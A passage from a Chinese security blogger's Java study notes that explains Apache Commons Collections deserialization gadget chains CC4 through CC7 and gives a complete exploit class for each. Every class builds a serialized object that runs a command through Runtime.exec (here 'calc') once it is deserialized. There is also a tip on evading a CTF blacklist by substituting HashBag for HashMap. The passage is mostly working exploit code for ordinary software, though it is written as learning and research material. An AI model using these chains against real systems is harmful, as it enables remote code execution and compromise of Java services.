            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}</code></pre>
<ul>
<li>CommonsCollections4</li>
</ul>
<p>依赖环境变为Commons Collections 4.0</p>
<p>似乎就是个杂交……因为依赖变为4.0了。直接使用CC2 中的queue+ CC3中的transform调用。</p>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc4 {

    public static void main(String[] args) throws Exception{

        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);

        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(1);


        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;byc&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;

        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;byc404&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);

        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        Object[] queue_array = new Object[]{templates,1};

        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
        queue_field.setAccessible(true);
        queue_field.set(queue,queue_array);

        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
        size.setAccessible(true);
        size.set(queue,2);


        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        comparator_field.setAccessible(true);
        comparator_field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}</code></pre>
<ul>
<li>CommonsCollections5</li>
</ul>
<p>cc5跟过一次。当时没用jdk1.7的环境。现在实验下jdk1.7 + cc3依赖的exp.另外发现这个链子cc3,cc4依赖都可以使用。貌似是ysoserial只写了cc3的链子。稍微改下就可以用在cc4的环境了。</p>
<p>首先重点还是构造链子来调用喜闻乐见的反射transform rce payload.这里的方法在第一篇学反序列化时已经跟过了</p>
<p>然后是一个细节：</p>
<blockquote>
<p><code>TransformedMap.decorate()</code>方法能将普通的MapA转换为TransformedMapB，同时如果<code>TransformedMap.decorate()</code>方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer</p>
</blockquote>
<p>之所以提到<code>decorate()</code>是因为我自己这一部分cc1的链子在书写exp中用的是反射实例化的lazymap。当时只是跟着别人的exp用反射实例化了，结果后来发现明明cc3依赖中直接decorate就可以创建lazymap。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/39.PNG" class="lazyload" data-srcset="39.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这个方法在cc4依赖中变为了LazpMap方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/40.PNG" class="lazyload" data-srcset="40.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>然后核心还是跟cc1一样,此时只要一个调用LazyMap#get的位置来触发rce。</p>
<p>用到的gadget是TiedMapEntry#toString =&gt; getValue =&gt; get.需要this.map为LazyMap.跟过一遍就不再说了。</p>
<p>再接下来是BadAttributeValueExpException来触发toString.<br>因为其readObject中<code>valobj.toString</code>的valobj来自输入的val。所以直接反射设置为TiedMapEntry即可</p>
<pre><code class="java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get(&quot;val&quot;, null);
    ......</code></pre>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap&lt;String, String&gt;();

        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;placeholder&quot;);
        Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));
            oos.writeObject(badAttributeValueExpException);
            oos.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p>然后上面说了。换成cc4依赖是通杀的。我们只需将exp中依赖全部换成4的，然后decorate方法换成lazyMap来实例化LazyMap即可</p>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap&lt;String, String&gt;();
        Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer);
        //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;placeholder&quot;);
        Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));
            oos.writeObject(badAttributeValueExpException);
            oos.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<ul>
<li>CommonsCollections6</li>
</ul>
<p>比较类似CC5的链子。然后利用环境也是3,4通杀。</p>
<p>cc6的gadget与cc5的区别在于没有利用TiedMapEntry#toString,而是TiedMapEntry#hashCode</p>
<p>这个方法在URLDNS中出现过,在反序列化时会重新计算对象的 hashCode.</p>
<pre><code class="java">public int hashCode() {
    Object value = this.getValue();
    return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
}

public Object getValue() {
    return this.map.get(this.key);
}</code></pre>
<p>跟toString一样调用了getValue。所以就基本一样了。</p>
<p>触发hashcode的方法是利用Hashmap类的hash</p>
<pre><code class="java">final int hash(Object k) {
    int h = hashSeed;
    if (0 != h &amp;&amp; k instanceof String) {
        return sun.misc.Hashing.stringHash32((String) k);
    }

    h ^= k.hashCode();

    // This function ensures that hashCodes that differ only by
    // constant multiples at each bit position have a bounded
    // number of collisions (approximately 8 at default load factor).
    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
}</code></pre>
<p>加上hashMap.put</p>
<pre><code class="java">public V put(K key, V value) {
    if (table == EMPTY_TABLE) {
        inflateTable(threshold);
    }
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);
    int i = indexFor(hash, table.length);
    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }</code></pre>
<p>这样就可以直接put触发了。然后官方的链子不知道为啥加上了一个Hashset,有点奇怪。</p>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, &quot;byc&quot;);

        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        innerMap.clear();

        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));
            oos.writeObject(hashMap);
            oos.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p>同样也是cc依赖3,4通用。</p>
<p>然后强网杯当时一道java题记得就是用的cc6的链子改了下。因为当时是存在手写的黑名单，不能用hashmap,但是可以找替代的hashcode来利用。所以用HashBag替换一下就行。</p>
<pre><code class="java">HashBag hashMap = new HashBag();
hashMap.add(tiedMapEntry, 1);</code></pre>
<p>hashBag继承了一个抽象类,然后方法基本跟HashMap差不多。所以小改下就可以直接打了。</p>
<ul>
<li>CommonsCollections7</li>
</ul>
<p>cc7的链子是通过AbstractMap#equals来触发LazyMap#get</p>
<pre><code class="java">public boolean equals(Object o) {
    if (o == this)
        return true;

    if (!(o instanceof Map))
        return false;
    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;
    if (m.size() != size())
        return false;

    try {
        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
        while (i.hasNext()) {
            Entry&lt;K,V&gt; e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}</code></pre>
<p>这里如果控制m为lazymap即可触发rce.</p>
<p>然后cc7是在HashTable#reconstitutionPut中调用过equals方法</p>
<pre><code class="java">int hash = hash(key);
    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
    for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
        ......</code></pre>
<p>然后HashTable的readObject也调用过了reconstitutionPut.所以可以触发。</p>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

public class cc7 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap1 = new HashMap&lt;String, String&gt;();
        innerMap1.put(&quot;yy&quot;, &quot;1&quot;); // &quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode() == 3872
        HashMap innerMap2 = new HashMap&lt;String, String&gt;();
        innerMap2.put(&quot;zZ&quot;, &quot;1&quot;);

        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);
        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);

        HashMap hashMap = new HashMap();
        hashMap.put(lazyMap1, &quot;placeholder&quot;);
        hashMap.put(lazyMap2, &quot;placeholder&quot;);

        innerMap1.remove(&quot;zZ&quot;); 

        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;); 
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));
            oos.writeObject(hashMap);
            oos.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));
            inputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p>这里有个细节。就是首先需要put两次才能调用equals方法。<br>然后由于一个小bug</p>
<pre><code class="java">&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code></pre>
<p>会导致”碰撞”发生，其实就是因为这样计算出来的hash一致所以会导致它调用其中一个对象的equals方法进行比较。这样就能成功进入我们的gadget了。最后expremove掉zZ这第二个元素。这是要去掉这个键。否则这个hashmap会带上无法序列化的对象从而使反序列化失败。</p>
<ul>
<li>summary</li>
</ul>
<p>没想到最后还是成功把链子都跟完了。这篇文章就写这么多了。反序列化的gadget跟进说实话比起php少了一点变通，但是难度还是有点大的。不过整体下来不难发现Map类,cc库中的一系列Transformer类，反射的技巧起到了至关重要的作用。并且实际上肯定存在更多gadget等待发掘。</p>
<p>后面会抽空去学习下shiro,jackson,fastjson等等的深度分析。</p>

  
  
    
    <div class='footer'>
      
      
      
        <div class='copyright'>
          <blockquote>
            
              
                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

              
            
              
                <p>本文永久链接是：<a href=https://www.bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/>https://www.bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/</a></p>
              
            
          </blockquote>
        </div>
      
      
        <div class='donate'>
          <div class='imgs'>
            
              <img src='/assests/wechat.png'>
            
          </div>
        </div>
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:08:44+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：Feb 18, 2021</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Java/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Java</p></a></div>


        
      
    </div>
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/2020/07/16/hackthebox-SneakyMailer/'>
          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>hackthebox-SneakyMailer</p>
          <p class='content'>SneakyMailer是自己在htb上完成的第30台靶机。因为特殊纪念意义加上涉及到一些很有意思的知识所以记录下。整体难度比较简单。
由于SneakyMailer还是active状态，所以我会...</p>
        </a>
      
      
        <a class='next' href='/2020/07/05/SCTF2020-writeup/'>
          <p class='title'>SCTF2020 writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>越打越菜 :(这次比赛难度相比上次RCTF的难度好了点。但是最后还是只能感慨自己tcl。做出来的只有CloudDisk跟UnsafeDefenseSystem.相比下solve比较多的pytho...</p>
        </a>
      
    </div>
  
</article>


  

  <article class="post white-box reveal shadow" id="comments">
    <p ct><i class='fas fa-comments'></i> 评论</p>
    
    <div id="valine_container" class="valine_thread">
  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
</div>

  </article>






</div>
<aside class='l_side'>
  
  
    
    



  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vulns"><span class="toc-text">vulns</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserialization"><span class="toc-text">deserialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti"><span class="toc-text">ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL"><span class="toc-text">SpEL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url-security-issues"><span class="toc-text">url security issues</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi"><span class="toc-text">java-rmi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi注入"><span class="toc-text">jndi注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#develop"><span class="toc-text">develop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat"><span class="toc-text">tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#maven"><span class="toc-text">maven</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring"><span class="toc-text">Spring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpringMVC"><span class="toc-text">SpringMVC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Audit"><span class="toc-text">Audit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserialization-gadgets"><span class="toc-text">deserialization gadgets</span></a></li></ol></li></ol>
    </div>
  </section>


  


</aside>



		  
		  <!--此文件用来存放一些不方便取值的变量-->
<!--思路大概是将值藏到重加载的区域内-->

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.postTitle="学习笔记-Java相关";
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  // header 这里无论是否开启pjax都需要
  var l_header=document.getElementById("l_header");
  
  l_header.classList.remove("show");
  
  
    // cover
    var cover_wrapper=document.querySelector('.cover-wrapper');
    
    cover_wrapper.id="half";
    cover_wrapper.style.display="";
    
  
</script>

        </div>
        
  
  <footer class="footer clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="/atom.xml"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
            
              <a href="mailto:baiyecha404@gmail.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
            
              <a href="https://github.com/baiyecha404"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        
          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
</div>
        
      
    
      
        Use
        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
        as theme
      
    
      
        <div class='copyright'>
        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>

        </div>
      
    
  </footer>


        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
      </div>
    </div>
    <div>
      <script>
/************这个文件存放不需要重载的全局变量和全局函数*********/
window.volantis={};
window.volantis.loadcss=document.getElementById("loadcss");
/******************** Pjax ********************************/
function VPjax(){
	this.list=[] // 存放回调函数
	this.start=()=>{
	  for(var i=0;i<this.list.length;i++){
		this.list[i].run();
	  }
	}
	this.push=(fn,name)=>{
		var f=new PjaxItem(fn,name);
		this.list.push(f);
	}
	// 构造一个可以run的对象
	function PjaxItem(fn,name){
		// 函数名称
		this.name = name || fn.name
		// run方法
		this.run=()=>{
			fn()
		}
	}
}
volantis.pjax={}
volantis.pjax.method={
	complete: new VPjax(),
	error: new VPjax(),
	send: new VPjax()
}
volantis.pjax={
	...volantis.pjax,
	push: volantis.pjax.method.complete.push,
	error: volantis.pjax.method.error.push,
	send: volantis.pjax.method.send.push
}
/********************脚本懒加载函数********************************/
// 已经加入了setTimeout
function loadScript(src, cb) {
	setTimeout(function() {
		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
		var script = document.createElement('script');
		script.setAttribute('type','text/javascript');
		if (cb) script.onload = cb;
		script.setAttribute('src', src);
		HEAD.appendChild(script);
	});
}
//https://github.com/filamentgroup/loadCSS
var loadCSS = function( href, before, media, attributes ){
	var doc = window.document;
	var ss = doc.createElement( "link" );
	var ref;
	if( before ){
		ref = before;
	}
	else {
		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
		ref = refs[ refs.length - 1];
	}
	var sheets = doc.styleSheets;
	if( attributes ){
		for( var attributeName in attributes ){
			if( attributes.hasOwnProperty( attributeName ) ){
				ss.setAttribute( attributeName, attributes[attributeName] );
			}
		}
	}
	ss.rel = "stylesheet";
	ss.href = href;
	ss.media = "only x";
	function ready( cb ){
		if( doc.body ){
			return cb();
		}
		setTimeout(function(){
			ready( cb );
		});
	}
	ready( function(){
		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
	});
	var onloadcssdefined = function( cb ){
		var resolvedHref = ss.href;
		var i = sheets.length;
		while( i-- ){
			if( sheets[ i ].href === resolvedHref ){
				return cb();
			}
		}
		setTimeout(function() {
			onloadcssdefined( cb );
		});
	};
	function loadCB(){
		if( ss.addEventListener ){
			ss.removeEventListener( "load", loadCB );
		}
		ss.media = media || "all";
	}
	if( ss.addEventListener ){
		ss.addEventListener( "load", loadCB);
	}
	ss.onloadcssdefined = onloadcssdefined;
	onloadcssdefined( loadCB );
	return ss;
};
</script>
<script>
  
  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
  
  
  
  
  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
  
</script>
<!-- required -->

<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>

<script>
  function pjax_fancybox() {
    $(".md .gallery").find("img").each(function () { //渲染 fancybox
      var element = document.createElement("a"); // a 标签
      $(element).attr("class", "fancybox");
      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
      $(element).attr("href", $(this).attr("src"));
      if ($(this).attr("data-original")) {
        $(element).attr("href", $(this).attr("data-original"));
      }
      $(element).attr("data-fancybox", "images");
      var caption = "";   // 描述信息
      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
        $(element).attr('data-caption', $(this).attr('alt'));
        caption = $(this).attr('alt');
      }
      var div = document.createElement("div");
      $(div).addClass("fancybox");
      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
      var span = document.createElement("span");
      $(span).addClass("image-caption");
      $(span).text(caption); // 加描述
      $(this).after(span);  // 再套一层描述
      $(this).wrap(element);  // 最后套 a 标签
    })
    $(".md .gallery").find("img").fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
      closeClick: true,
      helpers: {
        overlay: {closeClick: true}
      },
      buttons: [
        "zoom",
        "close"
      ]
    });
  };
  function SCload_fancybox() {
    if ($(".md .gallery").find("img").length == 0) return;
    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
